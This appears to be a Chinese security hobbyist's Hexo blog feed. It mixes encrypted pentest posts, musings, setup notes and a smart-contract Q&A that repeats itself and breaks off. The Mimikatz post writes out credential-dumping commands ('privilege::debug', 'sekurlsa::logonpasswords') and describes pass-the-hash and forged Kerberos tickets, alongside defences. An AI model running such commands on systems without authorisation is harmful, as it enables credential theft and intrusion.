afaa41470178040979a8ff8b7a6f67097488a6587c561e975228c0e4f825f0eef6fb101830b2634f492b3cfca42436db6f8d5930fca5e28d024465a6d7eac472786325bf2e1c7bd260871705063b318b49a9e83df094625d37f077f3df3ecbaedda0de7e6b4c0e4f9b3fda019d79fb840b6f7c82f7d575c629bae670cfaf76cbaf6c488fd8ff750fb2e6e64cc244a1127f5e0f3f6490979b4ffdf4638ae288b541f1e8b0e6b51f99d1f66b63eb4487978d258f5f22f17ebd35902b66f68266c00d4496214506934c2b2135c52d7c28580e647d7689c3750f0ba381f041b9260fbd9b08125c1527f3ada2b998e9aa4badd6002ae4a1736ca59cc0cb8a24f2323d5e83dac2a980e1c80310241f726d01a3bf1b4b997bd4998fda1175956f049cfe73c37fdb66039af0482d404a4875730d3e7952971de8d4f6bef5fbb1d636cf6bc74b0e07c96d7d859bec024772095dcfd7cb034936912bd11717357433e3e563386d81305c809f2cbd9f4a34a3af9bebd3bd4f831246f75600940b04bbfe31b7f13e67bb1330dc3afe08e690572d6477cd9121ba662ce729902394b500e682b3637ca3f8a5e75e7ff8f4c820c773d7091d62a0f7de926e732cdbf88128955966a9f8909e7223f8c5b665afb04ef7be487ae49a3eb03addf7be02f0372c8744fc05ce715c8ceeffb2af680de10f7189393b57343c5c7d73a43fd15f224cd522b7e0a2610def622500f850942d4096861361265043becf81042968aee3bd7b3a1325131c12eb47543360c192db479f9eb9e2c8416527c0de80ddbe016d0ad4d38c78d0a6d178557da63865107c3380c158c0350d0d21899dfc1eaf1362ec5acc65e5247c1eb2911c131e5eb988180d7c6728685f4407468a70a3b42bf359e6a7ab2bcdcede6a3fe236ceec7f527322af6d0e72c9b8c586debf116c557e4ae2c8dcde3bdd6c26ebb0990a02a4a5eaffa06887f3e19bc91a182d04d15707d62966c6ac110c97333b092892c13367d686d736c0c3f437ef6d791974580b90f32a25abc749d7ef309d597132bbb432893af5efee80949e3d8d6abe048c92fad511bf4e47e0ad3ac643758edc842add036acb0500ff13dcae891ca19a3952834d6ff0c8ce1845d513ff229d21dce8c7b72364ff6dc6189b55a9772e081828efc8374fdf40f87fa0cb58b485b1b6a078753a78f3b6ae33ef5952aaa8e90b9bc544df294c2f903e6df23c5ffbca30c5e2e470a17fe36f67f57550240efc3c5109be478e67719f0981cb3392135c5c3cd98984ba59b8656f0d7c697ab7b646afbb67573000c2ec0fd2637df0a3e8f1e4290df3f2db28abb1cce6e88498bfd8aad6f6838d6aa58b9132c47cfbe38d7b5d5ae5993cca653ff92aba98818ed7e2abcee33b70f45308a707f89f21e1fb697946887898bb27a78d2be035ddad2a0374cc00d5d474b7be5b5aab62f5b2a0cd8ef1b25473f003165d1cd1f2415a8c5060863a8c38287c699c8e2f6f8e133ac65f55fdfc4b4069dba26a903c2795029cf558b54caf1bd08fa15300f7a84f400b4df1b5776c917236ddf6264ce9d37f1c86c95b8277fc45285df9c52f94ac449d0afd02c507ad8e89cb8ee9885ffb8ddbc7df7ee212e6bc0cd248410afefb66e1400626c15062f582bb8657250da3e92a5c0ac5781f48646318fe50086533330ce775be34ca4f81e7e6ef285c3d88a576e7bf26d9da1bc953fe833fb1eff1dadd02445107954f3f4d3ac34106360befb6a3e66906d7915cd73aa72d7679dd1d68937159e8b1aceabb0743ef832aac5a100dcd67d68dded5b002492a4c8770c6e89898a0dd21ea347be89570a39d36db141bfda601edb3b1aff035862f91fc880fb4d32c513aa8e7f7b2994ea92a976d579c42d225c5271b9e3b57e1ecf9583387986c8c5b2fb0165299eb3d102faa037146b84ced3e8d173c61c1ad16a92bfc1ef8bedda764fdf224626bfac1fc5d6397e56eec0d13164578441b1610e0d2d6763fb45b9943b80f64acd85d99c2e127c07f530c4371a75a58ab83652eb781d96c669370c906aa5aeca234b708335d2e6a4de71a353d35fe8ec483d0f0c64f5b0d3e3526d8ca61f30a37a2b6ef86229eb8633fd682893a70c0759d5e3d5be8ddfb6556cef453b3afe1c205c1b6b7f4539638468dc1dd5d83683fc6c32b72557042216ddbe9b0023dad5d15bf1ca16b8a5d65fb0763f64522fe6d25c94d2e22096d68a6af204a341df3eb383ad730833244b770df8937bfd42947d808715c8e0fd15b40ea701ff6dc4c5c6926d94015f40d5a0d2eb9eb18b44f0a91592925899f1e7c34d25baac5d0445f70b5e506d3b9a59aaa06e9e92533721df85789eacabc5a2708c355cf7fc8ae0961e6f61862418617c2b762959e0a523cad74b68d55d26d6dde3820f6bd7a291ed7e2686f35e9b3f8bd1eab9b9c606a130a4074de642fa97ae265e1a8c647c4969a9cb1fb555d64653bf2557a7bb10a5cfcd3d37f33c09bf1c7f89433f31f4b1251d49a5b5d8597fd38c79c560c3b44e984f7395363cee0cff4173ca50f7befa3b47c72679ee59c05ff9cb2f99c56616cd522838e7bb564aade425391a96838bc5c7c08a8788813ff2d5cc549f0229b98cf619cdf815895b981c005babcd5fde60a8db706954870858360ed1588e89d944b3ef9a6fa0cf1b8a01baaafeb16926a246475ee796ca339dd399dd92d0cc269da09879567cad17b55316b3a02d145ae8a75d47185e3e1cc198c9c004785a0576ce5f6dc7d29de22f665e16497e7753d4c615d5ff9024d13f9b9e0e60851b0b84d83e3b7e03fcace5a8fe367d69a2fd9165aa9606c3c158b5710140dcb73301a952e09426d547b1ec579205400a1321e6903e7b3dabe4944b77b88a9704b090e888907e8c78e0a2e2ce51b76cf1188e547e8bf061460824cbf3df7326cd81f1d2aedef79427fb77a0c7d38d6d2afb42eab52954e0d32c3db51a1850ffacd582bb1ec4ef57102923bac3b170540eddd152aac81d4e436ca091e8487f73a84ed274a51cfc453aaada380b5ac713218db4bfdc54071de977dbf2b8fbf65e5a0be24b5cb9d1af48f229038e2d81661be3c23f9e4c1035587b3f75db65e401e866561bf89ecdc2b7d4ed2030ffea04525f6e491625875d675ff56711dd30fc400e5aa217fb0fce39bff326e35323abc56365b9f518950b7c5a623eb2ade3cd83383ec97377f1cd474eb71d241a84bd89d2d0245286df61a6d401037f93dcffd91d12bc32543b69f1c386d0b2a373691a8b916cb0bd7cdb38b02903029dc7d0de2cb88599db8c1ec15d6034a97d5f55420cca787577c43407224f8d107def0262b2840a5095bb9d53a9d0254afc623afe19dafb3519d5972e4f52b3ed489797fddeba55cae248e16fde33b795bf8ad21a8ef10a4345089c5b06b83440708d1a9cfb5f9a83c081a65a8c1241f2ce400b7ee17f72af8bb3c440e9f546796ef89aaed5e57a31f91600bde69797f98a89429af30154a490494fb07d3b9a79f5f89ba5611c490cec0ac4aa7ad296a631e47d36950b3c3e87a1e974ba259c8d473afeddefbd2133e749cc96b6e99fcdf479896baa2b56c559c4f469269fdf10a7dc5fe39ac829fb44a3993f28609d2b513e600c3597aca0200abc67821c50d9daa0567efa730effbb3959dc9db44f8dc6603e6d9ab6d37897a770b68daa8875b3086146d14221fd699d1fbd0d5312428e4e454b5254b00fa0421ed5a24093b2b1704ad0100e6622e2469292e2586fea95d32b8893d1e97342c550f87f443a81b6bc82df66acdce933b5aee5d4df692a4d2056d335e05463d2ca5336b56ddef761ca894f4a481e72c13a3238c7b522f038f2379bd3f4e66af4ccb7b74adb8caf850bd0831b4eb0d6f080f19f01877a746ef8edd4b5b88f93575e261160c6f631adc9455b12d34d1b43296f683770ef2ca8a1379af78926274fdd3fcc7e71629c50593f89d9079b3eb60858b82a5075fc1c59ad1c424afcb6fca4dc722b53552b12e96e1da06bcc752a3fffdf3bf115261d7cf56e9bb7bad75e9bfaa999e6d0a108147ea7326def7ccb3d9e3e117782436f71419cf607311518333ade224a7def0778079f878546a2cafba93f1728d40bf2d8a19d0e86b642be4e9bdbb6cedc942849077e45f43eaffa0fbc6bbf924531d9b6ac32142c297a57d3c0f404089f38cb61d0c54428e74ea6c5654e169dbf5c881370e561024294c558ba66e88058cb588b80d16d20ea07197f915ae9a37913a619dd23669fc6a83a20de04166b9175e944849d3e65b66eb20477ab9fad86fe64972a7132b3280e5e68df51c010c328a1b98790ef1d7a49103d9f8b4d71712833d32c07f49187f7e2ca5c4a223bf688426d5a063abeb445d1744a3024b8fe0d7cb3f2b9a9f09b8b703b2f4e0a50fe0be394d037da9cf5f3cce7661f1ddb78f94fee415a76def725d372d03557f249fb2e5d1498ef9b49754cb11152aa2db3c4a9f45cb1dc811a2ccdae6ecf874a605a75a6cd0945ccea1037f83025401766768d04f73feb16f575f882dd5561da1c2fe2aa28f42d9690c0358f644ef04ec580c34d0d3cd961c6fcfc2ac70efc8175bce8f92061c6373b25757df19893f2acb085d5c9389f94a88d8c94500ab6aac5e7c34ad3baf72a43b64efd84d82c8f8e301c720c990825dd4f4e436b2d5763f8c99bb3328c35c89ff99e4163e93c231e4f2d8035202f433d0d1719031e257fce93626b4de3c66cecb0a2f609888b0f59bbce791d44a200c73ede2be6407e479f90fe6581d0dd5cacf9f8e3ca015bbba462fe82dddd3cd2c13a0fe3ccba3677a7f408a75af29d7690d6f29a7afae6d588cb710cdcc29653ef605f2ca96e609fb6ef7568c4c386b3512e1b8f929538625c6aa968cbd5e297ff93bb314bebdd4ec70fff5880cbb4ace35bac354f6bcbbf92d9675684fe68b1cf403bb0db0c0363af2929d88458ab088b1ddbaf908bada0e3bb7bb41a5e87e934e4036bd40bdbc0a806bda3cdd50aefa715921c0bedc35d8b9196c5ce033ab437ed3e8f15a68699c09d96262cde29de862b92806b917c575a029b03d61d38c66aa2af271cc3b444e670ba2330ad7ef7bcb2b7947b0ab2c39037ce031c852596e6fd7ef6fce3d136a1158ddd50be7bf6df0c7086071558c14f248ca4fc456eebd7e75036c0e38f9f934e6256795755f1b0b08435b54d6342a0d4013e745010bbfb853aec6499915e2698b068b4e40e5495bb08fa024938e553b68d7cb7e4dbe2393a56849bbee7e3b5bb9227b830922870d24f2be98bb2d474f9b1947b57e1e9e96d7acfe1afaebb2c3f3a5cac41c81c5612e6616836762134656c529148f1d773bde9d1f8f24c22d40ca5ee1f2ffed29e954c1e060c9d3964ee16e57d3a39008fa4c0fb73397d2c631781ecc8b42015c2cde8dc19969b7ae073790f0668bd0feac241978db2a8e64b8edb94860702c69d9fbda20d5ccca4a795556a0249ed378c2056ec97bfeb7ccb4ab57cbc2a39d49c3ab013aeea725d76dc878ca6480cff357d557c323e56e50d7e86312477b1b821e7245dc2726905016413fc98f7fcc66e1ed444e37897d402025cf63a5ce23b4fb475e2914fd8f37de1a86364aab37a064596f69f7c16b6f2a2cb0ac69fe73be4700e2c8ce672a843ceaa89bce3c43e83b6137a81668222e66cbcf7126b52ad26b582914b761c1b87bc58dd4fa4beac405e13e1ef62156a59a01065d6910bd38fa68f7979ee582c497632dded6e0694b10034940cd165f238b3c450796001c041d7b2a309a9e7f66e1db8b81356c4fcda01a2e166ee4fab2fc0090ca9980511e8493e7b22e8ce003f2283e1ad31973f7aa2bac3f4ecd8f74e0b9e96737f1d9ca5bfe99cb49a8bbb96dfbefdcc3e7d6fb962630ded97c15d057842170e8bded4541043a7ad2b363690531512996dfa477da3a912e2cd01a04b98e22451bcea82e9a500e50e652e04166af92d472d8dbe5efc877fb58390017026590d9e9bb196240b48b16d7bba28b79c79f602a55034748249e54987cbc67ffd33caf05ec782dc0dbbbc44c001c7a5c11bb21f695302e32c490154e2c25d30cc698f1fd7ab5623875eaca7ecd9f435de8bb81e1ebd0fa2a00c445dce7199ca15d1020024d31192f33200941f08d2a27ffd19403442eb7350a2bb6b305db248f2f89f7b8afa870ed4453ba3b7fca3bd3e2711fa164329fa40acde770233b3cf92400a5bb09cd08b92f776a33613aac4325ae91098a044260370a60e9d6eaf0a62d4692a4c3870f53f2543722bc7f488568176bf626373939ccf82c5a28a600ea897ddb1f9e464801a0b80ed292846bd01fb71f337f89c4b5580b9c0f979dad7a2d07dc559a2637d72ef9538bcaea5fe8222f59b006a3d79e4318a719cfee3e109d284520657ba128aecb3045f6acc0c0be8c70e2ac5300880da2abfc335504573de5d0b530934f9073b834f5534650c7b39fa7452a37546976c3feda7fe9190950a970c8215669e793f3c98ec408aa36167f842170bff973edb1f9634a7cb012e62a8c6d1ed26219180e68d6a0538df24d0de330370a228ebbb317116e48925e48a019dcde1adb2751e9f9fb0bc686fac90d053d2470ca9cd59fccecfde4e54ddc25ffc30fac89d00706216af85ebb0048a3238c90b472b2f6a0f360073a671bcf94b8264b65f32f89acca201398b0c6562c109d1ce528a335d5e8cf3219e9294bde2913c89ab9c724609fde0ceaae72e0d71ef2a32fa75be647f8e8ea2d5d26d1bb3b75b7aa0b7e9a9c6111a5e5a8f32ea09f0382785ef572e6e89e8818a21e37d5846b59620205e4816df5c9105a1b43bbfcc54d7a0da65eba21442b872c03f333c9a3fa38b63b9708a5034f0e6ee6d40ba3a0a084e56752e105877c65e41e66002188daf007e334e837126262afd612c26f1299dc1f1536dd6a3bc65833822d1de16b72e0f67ff257415fa41618f26f790a7bf6b99da6f696d21ac6f85a77f7b0a63c03f8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序渗透流程</title>
      <link href="/2024/11/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/11/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="707c38de005ecd300eb6aa6eac39ca0e87caaa46f56d9080d7cab09d82c66ce5">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259686e6fc3261c47ce3bb093cbeb378c458dbe6c0c9b2d530d1583defaeccee5627e99a26e85688b8aab763564bd9a9bc3c8ebacbeb984492d80391066f2b9225d448c6a005a40c6ef17f47a41185d72e2a5c073f4e3f68a265633ba39fa1fc8689f6516ca80fb34ae1a09f6dfca162cf8c9364135002762b9b41b797112bfd965c1d0c0e535aaa2fd29657e2818e910abd4fe829094adc3ddfc9879bfdab2044b3b92c420be82eed905bb4c2fbcb468912a953bb65bc670569273e42f1a51c3edce495d3b16b77d7e23d5c3916ba25eb6e0c7ded085a43e7e6d17130f383e80967ba60804e607825180516af4b3ec8c8ea366a94bef21dd9ce561f9d8cb43a565590f8c1f42c0b34f847876052f99db58daf40ee057bf59db8f5d49f71ab5baaf21d5d940525f123c4cd4641514df44df9e38a0419de9712156273582965d7aec0fe2faef38bf49f9cbc6e687cd2ed32118962ce535923ca65fec6427fb96b954f2c5397a03f910e81be6b61759c9b24e0460e46bca6e84f36642c939d4d7700a435abdd6d672ea64a53b58fd7b56169c78eb51f56a603b0a886ec150f3b06b87cfd08df636c9d3681835f108ba019ec5a63b7a209b2e6e1b8ddb80414c7759af3f4a265079169267bb7c6da411fee35a674208eb3a368852c5a1845b9ca79d17abf5b864eb622c2f3b782fdaf33ca91584fdf00ed944a9c6a93cf4eb3c3183c5ff09290d43b374093898d09a43cfe8a4102b7f7c1e3c2480ea62a98e1c7e35388a723f31071f4fac76e182c0ef5aa2eb2676ef5a23fa137ebd8a3febde886b04a8ec1cf5353230fcd0dd9985f3fdfe2f6439cab5a186257a60d257c19c3fc2cc22e48c6456c2849a9414f74194a3ceaaa1d294476d8f18038b046479053a1163643c247484af18beb862ae8d66a7f471bda76d13e9cc4203108b788bc778c261b208db01d085c08cbad398effd76ac20a72be443e2865918b4801eab021f0e122b79b9809ddd55729be2a2e0d19c4d99d34689b1a6a609c1f98f03b67c95742a9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mimikatzwindwos凭证获取</title>
      <link href="/2024/11/13/Mimikatz/"/>
      <url>/2024/11/13/Mimikatz/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><strong>Mimikatz</strong> 是一个开源的、功能强大的安全工具，广泛用于渗透测试和网络安全审计。由 Benjamin Delpy 开发，它的主要功能是提取 Windows 系统中的用户凭证，包括密码、哈希、PIN 等。Mimikatz 通常用于模拟真实攻击以验证系统的安全性，并协助管理员理解和改进 Windows 系统的安全防护措施。</p><h3 id="Mimikatz-的主要功能"><a href="#Mimikatz-的主要功能" class="headerlink" title="Mimikatz 的主要功能"></a>Mimikatz 的主要功能</h3><ol><li><p><strong>内存中提取明文密码</strong>：能够从 Windows 系统的 LSASS 进程中提取出明文密码，但需要管理员权限。</p></li><li><p><strong>提取 NTLM 和 Kerberos Hash</strong>：可以获取 NTLM 和 Kerberos 哈希，供攻击者使用其他工具进行哈希传递攻击 (Pass-the-Hash)。</p></li><li><p><strong>Pass-the-Hash (PTH) 攻击</strong>：允许使用提取的 NTLM 哈希，而不需要明文密码，从而模拟用户身份。</p></li><li><p><strong>Pass-the-Ticket (PTT) 攻击</strong>：利用 Kerberos ticket（TGT或TGS）进行攻击，实现对目标系统的访问。</p></li><li><p>**金票 (Golden Ticket)**：Mimikatz 可以生成一个有效的伪造 Kerberos TGT，从而获得对目标域环境的持久访问权限。</p></li><li><p>**银票 (Silver Ticket)**：生成伪造的服务票据 (TGS) 来访问特定的服务。</p></li><li><p><strong>权限提升</strong>：通过利用 Windows 系统的漏洞提升用户权限。</p></li></ol><h3 id="使用-Mimikatz-的基本步骤"><a href="#使用-Mimikatz-的基本步骤" class="headerlink" title="使用 Mimikatz 的基本步骤"></a>使用 Mimikatz 的基本步骤</h3><ol><li><p><strong>启动 Mimikatz</strong>：<br>下载并运行 Mimikatz，通常需要管理员权限或 SYSTEM 权限。</p></li><li><p><strong>启用权限</strong>：<br>使用以下命令来启用所需权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure></li><li><p><strong>提取密码或哈希</strong>：</p><ul><li>提取明文密码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li>获取 NTLM 哈希：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="常见的安全防护措施"><a href="#常见的安全防护措施" class="headerlink" title="常见的安全防护措施"></a>常见的安全防护措施</h3><p>由于 Mimikatz 能够轻松提取凭证和模拟攻击，企业通常会采取多层次的防护措施来抵御此类攻击，例如：</p><ul><li>使用 Windows Credential Guard 和 LSA Protection 来保护凭证。</li><li>强化用户权限控制，避免不必要的管理员权限分配。</li><li>定期监控系统日志，识别和阻止恶意活动。</li></ul><p>由于其功能强大且潜在的破坏性，Mimikatz 应仅在获得授权的合法渗透测试中使用，不得用于未经许可的入侵或破坏行为。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>想要什么</title>
      <link href="/2024/11/13/%E6%83%B3%E8%A6%81%E4%BB%80%E4%B9%88/"/>
      <url>/2024/11/13/%E6%83%B3%E8%A6%81%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="思考想要什么"><a href="#思考想要什么" class="headerlink" title="思考想要什么"></a>思考想要什么</h2><p>处于变局之中, 要保存能力,养好身体, 慢慢爬行.</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 胡思乱想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>胡思乱想</title>
      <link href="/2024/11/13/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
      <url>/2024/11/13/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="人类"><a href="#人类" class="headerlink" title="人类"></a>人类</h1><p>在历史长河中人类就近扮演者什么样的角色, 造物者? 毁灭者? 亦或者是 一粒尘埃?<br>人生不过五六十年, 何必非要在不喜欢的事情上堵上自己的一生.人类最终的归途都是走向灭亡. 超过三代 你在世界上的痕迹便不存在了.</p><p>做点自己喜欢的.</p><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>无论做什么，都要尝试把价值展示出来。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 胡思乱想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>update_blog</title>
      <link href="/2024/11/13/update-blog/"/>
      <url>/2024/11/13/update-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="迁移博客"><a href="#迁移博客" class="headerlink" title="迁移博客"></a>迁移博客</h2><p>使用OBS来进行博文管理<br>使用Hexo 来进行 页面生成</p><p>之前采用的是采用 <a href="https://jekyllrb.com/">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy">Chirpy</a>对于写笔记来说不太灵活，有点耗时。<br>不适用 github action 的原因是不想把为未经过渲染的文件也放到github上，有点乱。</p><p><a href="/../assets/img/Pasted%20image%2020241113201822.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241113201822.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241113205749.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241113205749.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241113210121.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241113210121.png"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wmware老是网络错误</title>
      <link href="/2024/11/13/2024011-10-VMware-QA/"/>
      <url>/2024/11/13/2024011-10-VMware-QA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>之前一出问题就是重启网络配置</p><p>只要确保这两个服务启动起来就可以了</p><p><a href="/../assets/img/image-121.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-121.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约的问和答</title>
      <link href="/2024/11/13/2024-11-12-smart_contract/"/>
      <url>/2024/11/13/2024-11-12-smart_contract/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>你提到的关于智能合约在投票系统中的可信性问题，确实是一个非常关键的讨论点，特别是智能合约在这种关键场景下的可靠性和公正性。</p><p>智能合约本身的透明性和自动化是其最大的优势，但它是否“可信”，以及是否有可能被“夹带私货”（即合约中可能存在不正当或恶意的代码），则取决于几个重要因素：</p><ol><li><p>合约代码的透明性<br>公开可见：智能合约部署到区块链后，其代码对所有人公开。任何人都可以查阅、审计合约的代码，确保它不包含不正当的行为或漏洞。这种透明性有助于增加对合约的信任。<br>开源和审计：如果智能合约是开源的，并经过了多方审计，尤其是独立第三方的审计，可信度会大大提高。开源的代码可以被任何开发者审查和修复，减少“夹带私货”的风险。</p></li><li><p>合约审计<br>第三方审计：对于关键应用（如投票系统），智能合约应该经过专业的安全审计。第三方审计机构（例如 OpenZeppelin、Trail of Bits 等）会全面评估合约的安全性，寻找潜在的漏洞或恶意代码。这类审计报告可以作为可信度的一部分，向用户证明合约的安全性。<br>社区审计：除了专业审计外，社区的参与也非常重要。开源社区和开发者群体会对智能合约进行不断的审查和反馈，及时发现并报告潜在问题。<br> <strong>审计机构的可靠性问题：</strong><br> 你提到的关于智能合约在投票系统中的可信性问题，确实是一个非常关键的讨论点，特别是智能合约在这种关键场景下的可靠性和公正性。</p><p> 智能合约本身的透明性和自动化是其最大的优势，但它是否“可信”，以及是否有可能被“夹带私货”（即合约中可能存在不正当或恶意的代码），则取决于几个重要因素：</p><ol><li>合约代码的透明性<br> 公开可见：智能合约部署到区块链后，其代码对所有人公开。任何人都可以查阅、审计合约的代码，确保它不包含不正当的行为或漏洞。这种透明性有助于增加对合约的信任。<br> 开源和审计：如果智能合约是开源的，并经过了多方审计，尤其是独立第三方的审计，可信度会大大提高。开源的代码可以被任何开发者审查和修复，减少“夹带私货”的风险。</li><li>合约审计<br> 第三方审计：对于关键应用（如投票系统），智能合约应该经过专业的安全审计。第三方审计机构（例如 OpenZeppelin、Trail of Bits 等）会全面评估合约的安全性，寻找潜在的漏洞或恶意代码。这类审计报告可以作为可信度的一部分，向用户证明合约的安全性。<br> 社区审计：除了专业审计外，社区的参与也非常重要。开源社区和开发者群体会对智能合约进行不断的审查和反馈，及时发现并报告潜在问题。</li><li>可验证的合约代码与逻辑<br> 可验证的代码逻辑：合约的核心逻辑应当是透明的、可验证的，特别是对于涉及投票和选举等高风险领域，合约必须确保投票过程中的每一笔交易都可以被追溯、验证且不可篡改。比如，投票合约应该避免一些容易被操纵的漏洞（如重复投票、隐藏投票结果、篡改计票等）。<br> 智能合约的验证机制：可以通过形式化验证（Formal Verification）技术对合约逻辑进行数学证明，确保合约在任何情况下都按预期执行，特别是在处理投票时，合约能够确保投票的公正性和正确性。</li><li>去中心化与信任<br> 去中心化：智能合约通常是部署在去中心化的区块链平台上，例如以太坊等。这意味着，合约一旦部署，无法由单一实体修改。这种去中心化特性增加了合约的可信性，因为没有一个中心化的控制者可以修改合约逻辑或操控结果。<br> 共识机制：区块链网络的共识机制（如以太坊的 PoW 或 PoS）确保了数据的一致性和安全性。每次合约执行时，都会通过区块链网络中的节点进行验证和记录，因此投票结果一旦提交，不易被篡改。</li><li>防止恶意操作的设计<br> 多重签名和审计：对于投票系统，可以采用多重签名机制，即合约的关键操作需要多个独立的方进行确认，减少单一方恶意篡改的可能性。<br> 不可篡改的投票记录：合约应确保投票一旦提交，即不可更改且不可删除，任何投票行为都会被永久记录在区块链上，任何人都可以查证。<br> 日志和审计追踪：智能合约应记录所有投票操作的日志，所有投票和更改都应该可以追溯和审计。这可以帮助用户检查是否有不正当的行为或“夹带私货”现象。</li><li>常见攻击与防范<br> 重入攻击（Reentrancy）：在智能合约中，重入攻击可能导致合约执行顺序的错误，进而影响投票或资金转移的结果。开发者需要使用防重入机制，例如在调用外部合约之前先更新状态。<br> 